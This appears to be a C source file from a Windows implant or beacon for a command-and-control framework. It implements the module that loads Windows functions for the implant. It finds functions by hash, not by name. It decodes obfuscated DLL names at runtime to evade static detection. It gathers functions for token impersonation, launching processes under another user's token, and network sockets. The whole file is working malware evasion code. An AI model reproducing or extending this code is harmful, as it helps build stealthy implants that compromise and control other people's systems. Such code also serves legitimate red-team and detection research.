#include "ApiLoader.h"
#include "ProcLoader.h"
#include "StrObfuscate.h"

void* __cdecl memset(void* Destination, int Value, size_t Size)
{
	unsigned char* p = (unsigned char*)Destination;
	unsigned char val = (unsigned char)Value;
	
	// Word-aligned fill for larger blocks
	if (Size >= sizeof(size_t)) {
		size_t pattern = val;
		for (size_t i = 1; i < sizeof(size_t); i++)
			pattern |= (pattern << 8);
		
		while (((size_t)p & (sizeof(size_t) - 1)) && Size) {
			*p++ = val;
			Size--;
		}
		while (Size >= sizeof(size_t)) {
			*(size_t*)p = pattern;
			p += sizeof(size_t);
			Size -= sizeof(size_t);
		}
	}
	while (Size--)
		*p++ = val;
	
	return Destination;
}

void* __cdecl memcpy(void* Dst, const void* Src, size_t Size)
{
	unsigned char* d = (unsigned char*)Dst;
	const unsigned char* s = (const unsigned char*)Src;
	
	// Word-aligned copy for larger blocks
	if (Size >= sizeof(size_t) && (((size_t)d | (size_t)s) & (sizeof(size_t) - 1)) == 0) {
		while (Size >= sizeof(size_t)) {
			*(size_t*)d = *(const size_t*)s;
			d += sizeof(size_t);
			s += sizeof(size_t);
			Size -= sizeof(size_t);
		}
	}
	while (Size--)
		*d++ = *s++;
	
	return Dst;
}

CHAR HdChrA(CHAR c) { return c; }
WCHAR HdChrW(WCHAR c) { return c; }

SYSMODULES* SysModules = NULL;
WINAPIFUNC* ApiWin     = NULL;
NTAPIFUNC*  ApiNt      = NULL;

BOOL ApiLoad()
{
	HMODULE hKernel32Module = GetModuleAddress(HASH_LIB_KERNEL32);

	decltype(LocalAlloc)* allocProc = (decltype(LocalAlloc)*) GetSymbolAddress(hKernel32Module, HASH_FUNC_LOCALALLOC);

	SysModules = (SYSMODULES*) allocProc(LPTR, sizeof(SYSMODULES));
	ApiWin     = (WINAPIFUNC*) allocProc(LPTR, sizeof(WINAPIFUNC));
	ApiNt      = (NTAPIFUNC*)  allocProc(LPTR, sizeof(NTAPIFUNC));

	SysModules->Kernel32 = hKernel32Module;

	if ( ApiWin && hKernel32Module) {
		// kernel32
		ApiWin->LoadLibraryA = (decltype(LoadLibraryA)*)GetSymbolAddress(hKernel32Module, HASH_FUNC_LOADLIBRARYA);

		ApiWin->CopyFileA				= (decltype(CopyFileA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_COPYFILEA);
		ApiWin->CreateDirectoryA		= (decltype(CreateDirectoryA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEDIRECTORYA);
		ApiWin->CreateFileA				= (decltype(CreateFileA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEFILEA);
		ApiWin->CreateNamedPipeA        = (decltype(CreateNamedPipeA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATENAMEDPIPEA);
		ApiWin->CreatePipe				= (decltype(CreatePipe)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEPIPE);
		ApiWin->CreateProcessA			= (decltype(CreateProcessA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEPROCESSA);
		ApiWin->CreateEventA            = (decltype(CreateEventA)*)            GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEEVENTA);
		ApiWin->CreateThread            = (decltype(CreateThread)*)            GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATETHREAD);
		ApiWin->DisconnectNamedPipe     = (decltype(DisconnectNamedPipe)*)     GetSymbolAddress(hKernel32Module, HASH_FUNC_DISCONNECTNAMEDPIPE);
		ApiWin->DeleteCriticalSection   = (decltype(DeleteCriticalSection)*)   GetSymbolAddress(hKernel32Module, HASH_FUNC_DELETECRITICALSECTION);
		ApiWin->DeleteFileA				= (decltype(DeleteFileA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_DELETEFILEA);
		ApiWin->EnterCriticalSection    = (decltype(EnterCriticalSection)*)    GetSymbolAddress(hKernel32Module, HASH_FUNC_ENTERCRITICALSECTION);
		ApiWin->TryEnterCriticalSection = (decltype(TryEnterCriticalSection)*) GetSymbolAddress(hKernel32Module, HASH_FUNC_TRYENTERCRITICALSECTION);
		ApiWin->GetExitCodeProcess		= (decltype(GetExitCodeProcess)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETEXITCODEPROCESS);
		ApiWin->GetExitCodeThread		= (decltype(GetExitCodeThread)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETEXITCODETHREAD);
		ApiWin->FindClose				= (decltype(FindClose)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_FINDCLOSE);
		ApiWin->FindFirstFileA			= (decltype(FindFirstFileA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_FINDFIRSTFILEA);
		ApiWin->FindNextFileA			= (decltype(FindNextFileA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_FINDNEXTFILEA);
		ApiWin->FreeLibrary				= (decltype(FreeLibrary)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_FREELIBRARY);
		ApiWin->GetACP					= (decltype(GetACP)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETACP);
		ApiWin->GetComputerNameExA		= (decltype(GetComputerNameExA)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETCOMPUTERNAMEEXA);
		ApiWin->GetCurrentDirectoryA	= (decltype(GetCurrentDirectoryA)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETCURRENTDIRECTORYA);
		ApiWin->GetDriveTypeA			= (decltype(GetDriveTypeA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETDRIVETYPEA);
		ApiWin->GetFileSize				= (decltype(GetFileSize)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETFILESIZE);
		ApiWin->GetFileAttributesA		= (decltype(GetFileAttributesA)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETFILEATTRIBUTESA);
		ApiWin->GetFullPathNameA		= (decltype(GetFullPathNameA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETFULLPATHNAMEA);
		ApiWin->GetLastError			= (decltype(GetLastError)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETLASTERROR);
		ApiWin->GetLogicalDrives		= (decltype(GetLogicalDrives)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETLOGICALDRIVES);
		ApiWin->GetOEMCP				= (decltype(GetOEMCP)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETOEMCP);
		ApiWin->GetModuleBaseNameA		= (decltype(GetModuleBaseNameA)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_K32GETMODULEBASENAMEA);
		ApiWin->GetModuleHandleA		= (decltype(GetModuleHandleA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETMODULEHANDLEA);
		ApiWin->GetLocalTime			= (decltype(GetLocalTime)*)            GetSymbolAddress(hKernel32Module, HASH_FUNC_GETLOCALTIME);
		ApiWin->GetSystemTimeAsFileTime = (decltype(GetSystemTimeAsFileTime)*) GetSymbolAddress(hKernel32Module, HASH_FUNC_GETSYSTEMTIMEASFILETIME);
		ApiWin->GetProcAddress			= (decltype(GetProcAddress)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETPROCADDRESS);
		ApiWin->GetTickCount			= (decltype(GetTickCount)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETTICKCOUNT);
		ApiWin->GetTimeZoneInformation	= (decltype(GetTimeZoneInformation)*)  GetSymbolAddress(hKernel32Module, HASH_FUNC_GETTIMEZONEINFORMATION);
		ApiWin->HeapAlloc				= (decltype(HeapAlloc)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_HEAPALLOC);
		ApiWin->HeapCreate				= (decltype(HeapCreate)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_HEAPCREATE);
		ApiWin->HeapDestroy				= (decltype(HeapDestroy)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_HEAPDESTROY);
		ApiWin->HeapReAlloc				= (decltype(HeapReAlloc)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_HEAPREALLOC);
		ApiWin->HeapFree				= (decltype(HeapFree)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_HEAPFREE);
		ApiWin->InitializeCriticalSection = (decltype(InitializeCriticalSection)*) GetSymbolAddress(hKernel32Module, HASH_FUNC_INITIALIZECRITICALSECTION);
		ApiWin->IsWow64Process			= (decltype(IsWow64Process)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_ISWOW64PROCESS);
		ApiWin->LocalAlloc				= allocProc;
		ApiWin->LocalFree				= (decltype(LocalFree)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_LOCALFREE);
		ApiWin->LocalReAlloc			= (decltype(LocalReAlloc)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_LOCALREALLOC);
		ApiWin->LeaveCriticalSection    = (decltype(LeaveCriticalSection)*)    GetSymbolAddress(hKernel32Module, HASH_FUNC_LEAVECRITICALSECTION);
		ApiWin->MoveFileA				= (decltype(MoveFileA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_MOVEFILEA);
		ApiWin->MultiByteToWideChar		= (decltype(MultiByteToWideChar)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_MULTIBYTETOWIDECHAR);
		ApiWin->PeekNamedPipe			= (decltype(PeekNamedPipe)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_PEEKNAMEDPIPE);
		ApiWin->ReadFile                = (decltype(ReadFile)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_READFILE);
		ApiWin->RemoveDirectoryA        = (decltype(RemoveDirectoryA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_REMOVEDIRECTORYA);
		ApiWin->RtlCaptureContext       = (decltype(RtlCaptureContext)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_RTLCAPTURECONTEXT);
		ApiWin->SetEvent                = (decltype(SetEvent)*)	               GetSymbolAddress(hKernel32Module, HASH_FUNC_SETEVENT);
		ApiWin->ResetEvent              = (decltype(ResetEvent)*)               GetSymbolAddress(hKernel32Module, HASH_FUNC_RESETEVENT);
		ApiWin->SetCurrentDirectoryA    = (decltype(SetCurrentDirectoryA)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_SETCURRENTDIRECTORYA);
		ApiWin->SetNamedPipeHandleState = (decltype(SetNamedPipeHandleState)*) GetSymbolAddress(hKernel32Module, HASH_FUNC_SETNAMEDPIPEHANDLESTATE);
		ApiWin->Sleep					= (decltype(Sleep)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_SLEEP);
		ApiWin->VirtualAlloc			= (decltype(VirtualAlloc)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_VIRTUALALLOC);
		ApiWin->VirtualFree				= (decltype(VirtualFree)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_VIRTUALFREE);
		ApiWin->WaitForSingleObject     = (decltype(WaitForSingleObject)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_WAITFORSINGLEOBJECT);
		ApiWin->WaitNamedPipeA          = (decltype(WaitNamedPipeA)*)	       GetSymbolAddress(hKernel32Module, HASH_FUNC_WAITNAMEDPIPEA);
		ApiWin->WideCharToMultiByte		= (decltype(WideCharToMultiByte)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_WIDECHARTOMULTIBYTE);
		ApiWin->WriteFile				= (decltype(WriteFile)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_WRITEFILE);

		// iphlpapi (obfuscated DLL name, beacon_c_patch encoding)
		CHAR iphlpapi_c[16];
		AxDeobfuscateToStack(iphlpapi_c, sizeof(iphlpapi_c), g_ax_obf_iphlpapi);
		HMODULE hIphlpapiModule = ApiWin->LoadLibraryA(iphlpapi_c);
		SysModules->Iphlpapi = hIphlpapiModule;
		if (hIphlpapiModule) {
			ApiWin->GetAdaptersInfo = (decltype(GetAdaptersInfo)*) GetSymbolAddress(hIphlpapiModule, HASH_FUNC_GETADAPTERSINFO);
		}

		CHAR advapi32_c[16];
		AxDeobfuscateToStack(advapi32_c, sizeof(advapi32_c), g_ax_obf_advapi32);
		HMODULE hAdvapi32Module = ApiWin->LoadLibraryA(advapi32_c);
		SysModules->Advapi32 = hAdvapi32Module;
		if (hAdvapi32Module) {
			ApiWin->GetTokenInformation		= (decltype(GetTokenInformation)*)     GetSymbolAddress(hAdvapi32Module, HASH_FUNC_GETTOKENINFORMATION);
			ApiWin->GetUserNameA			= (decltype(GetUserNameA)*)		       GetSymbolAddress(hAdvapi32Module, HASH_FUNC_GETUSERNAMEA);
			ApiWin->LookupAccountSidA		= (decltype(LookupAccountSidA)*)       GetSymbolAddress(hAdvapi32Module, HASH_FUNC_LOOKUPACCOUNTSIDA);
			ApiWin->RevertToSelf			= (decltype(RevertToSelf)*)		       GetSymbolAddress(hAdvapi32Module, HASH_FUNC_REVERTTOSELF );
			ApiWin->SetThreadToken			= (decltype(SetThreadToken)*)		   GetSymbolAddress(hAdvapi32Module, HASH_FUNC_SETTHREADTOKEN);
			ApiWin->ImpersonateLoggedOnUser = (decltype(ImpersonateLoggedOnUser)*) GetSymbolAddress(hAdvapi32Module, HASH_FUNC_IMPERSONATELOGGEDONUSER);
			ApiWin->DuplicateTokenEx        = (decltype(DuplicateTokenEx)*)        GetSymbolAddress(hAdvapi32Module, HASH_FUNC_DUPLICATETOKENEX);
			ApiWin->CreateProcessAsUserA    = (decltype(CreateProcessAsUserA)*)    GetSymbolAddress(hAdvapi32Module, HASH_FUNC_CREATEPROCESSASUSERA);
			ApiWin->CreateProcessWithTokenW = (decltype(CreateProcessWithTokenW)*) GetSymbolAddress(hAdvapi32Module, HASH_FUNC_CREATEPROCESSWITHTOKENW);
		}

		CHAR msvcrt_c[16];
		AxDeobfuscateToStack(msvcrt_c, sizeof(msvcrt_c), g_ax_obf_msvcrt);
		HMODULE hMsvcrtModule = ApiWin->LoadLibraryA(msvcrt_c);
		SysModules->Msvcrt = hMsvcrtModule;
		if (hMsvcrtModule) {
#if defined(DEBUG)
			ApiWin->printf = (printf_t)GetSymbolAddress(hMsvcrtModule, HASH_FUNC_PRINTF);
#endif
			ApiWin->vsnprintf = (vsnprintf_t) GetSymbolAddress(hMsvcrtModule, HASH_FUNC_VSNPRINTF);
			ApiWin->snprintf   = (snprintf_t) GetSymbolAddress(hMsvcrtModule, HASH_FUNC__SNPRINTF);
		}

		CHAR ws2_32_c[16];
		AxDeobfuscateToStack(ws2_32_c, sizeof(ws2_32_c), g_ax_obf_ws2_32);
		HMODULE hWs2_32Module = ApiWin->LoadLibraryA(ws2_32_c);
		SysModules->Ws2_32 = hWs2_32Module;
		if (hWs2_32Module) {
			ApiWin->WSAStartup      = (decltype(WSAStartup)*)      GetSymbolAddress(hWs2_32Module, HASH_FUNC_WSASTARTUP);
			ApiWin->WSACleanup      = (decltype(WSACleanup)*)      GetSymbolAddress(hWs2_32Module, HASH_FUNC_WSACLEANUP);
			ApiWin->WSAGetLastError = (decltype(WSAGetLastError)*) GetSymbolAddress(hWs2_32Module, HASH_FUNC_WSAGETLASTERROR);
			ApiWin->gethostbyname   = (decltype(gethostbyname)*)   GetSymbolAddress(hWs2_32Module, HASH_FUNC_GETHOSTBYNAME);
			ApiWin->socket			= (decltype(socket)*)          GetSymbolAddress(hWs2_32Module, HASH_FUNC_SOCKET);
			ApiWin->ioctlsocket		= (decltype(ioctlsocket)*)     GetSymbolAddress(hWs2_32Module, HASH_FUNC_IOCTLSOCKET);
			ApiWin->connect			= (decltype(connect)*)         GetSymbolAddress(hWs2_32Module, HASH_FUNC_CONNECT);
			ApiWin->setsockopt      = (decltype(setsockopt)*)      GetSymbolAddress(hWs2_32Module, HASH_FUNC_SETSOCKOPT);
			ApiWin->getsockopt	    = (decltype(getsockopt)*)      GetSymbolAddress(hWs2_32Module, HASH_FUNC_GETSOCKOPT);
			ApiWin->closesocket		= (decltype(closesocket)*)     GetSymbolAddress(hWs2_32Module, HASH_FUNC_CLOSESOCKET);
			ApiWin->select			= (decltype(select)*)          GetSymbolAddress(hWs2_32Module, HASH_FUNC_SELECT);
			ApiWin->__WSAFDIsSet    = (decltype(__WSAFDIsSet)*)    GetSymbolAddress(hWs2_32Module, HASH_FUNC___WSAFDISSET);
			ApiWin->shutdown		= (decltype(shutdown)*)        GetSymbolAddress(hWs2_32Module, HASH_FUNC_SHUTDOWN);
			ApiWin->recv     		= (decltype(recv)*)            GetSymbolAddress(hWs2_32Module, HASH_FUNC_RECV);
			ApiWin->recvfrom        = (decltype(recvfrom)*)        GetSymbolAddress(hWs2_32Module, HASH_FUNC_RECVFROM);
			ApiWin->send     		= (decltype(send)*)            GetSymbolAddress(hWs2_32Module, HASH_FUNC_SEND);
			ApiWin->sendto     		= (decltype(sendto)*)          GetSymbolAddress(hWs2_32Module, HASH_FUNC_SENDTO);
			ApiWin->accept     		= (decltype(accept)*)          GetSymbolAddress(hWs2_32Module, HASH_FUNC_ACCEPT);
			ApiWin->listen     		= (decltype(listen)*)          GetSymbolAddress(hWs2_32Module, HASH_FUNC_LISTEN);
			ApiWin->bind     		= (decltype(bind)*)            GetSymbolAddress(hWs2_32Module, HASH_FUNC_BIND);
		}
	}
	else {
		return FALSE;
	}

	if (ApiNt) {
		HMODULE hNtdllModule = GetModuleAddress(HASH_LIB_NTDLL);
		SysModules->Ntdll = hNtdllModule;
		if ( hNtdllModule ) {
			ApiNt->NtClose                   = (decltype(NtClose)*)					  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTCLOSE);
			ApiNt->NtContinue                = (decltype(NtContinue)*)				  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTCONTINUE);
			ApiNt->NtFreeVirtualMemory       = (decltype(NtFreeVirtualMemory)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTFREEVIRTUALMEMORY);
			ApiNt->NtQueryInformationProcess = (decltype(NtQueryInformationProcess)*) GetSymbolAddress(hNtdllModule, HASH_FUNC_NTQUERYINFORMATIONPROCESS);
			ApiNt->NtQuerySystemInformation  = (decltype(NtQuerySystemInformation)*)  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTQUERYSYSTEMINFORMATION);
			ApiNt->NtOpenProcess             = (decltype(NtOpenProcess)*)			  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTOPENPROCESS);
			ApiNt->NtOpenProcessToken        = (decltype(NtOpenProcessToken)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTOPENPROCESSTOKEN);
			ApiNt->NtOpenThreadToken         = (decltype(NtOpenThreadToken)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTOPENTHREADTOKEN);
			ApiNt->NtTerminateThread         = (decltype(NtTerminateThread)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTTERMINATETHREAD);
			ApiNt->NtTerminateProcess        = (decltype(NtTerminateProcess)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTTERMINATEPROCESS);
			ApiNt->RtlGetVersion             = (decltype(RtlGetVersion)*)			  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLGETVERSION);
			ApiNt->RtlExitUserThread         = (decltype(RtlExitUserThread)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLEXITUSERTHREAD);
			ApiNt->RtlExitUserProcess        = (decltype(RtlExitUserProcess)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLEXITUSERPROCESS);
			ApiNt->RtlIpv4StringToAddressA   = (decltype(RtlIpv4StringToAddressA)*)	  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLIPV4STRINGTOADDRESSA);
			ApiNt->RtlRandomEx               = (decltype(RtlRandomEx)*)				  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLRANDOMEX);
			ApiNt->RtlNtStatusToDosError     = (decltype(RtlNtStatusToDosError)*)	  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLNTSTATUSTODOSERROR);
		}
		else {
			return FALSE;
		}
	}
	else {
		return FALSE;
	}
	return TRUE;
}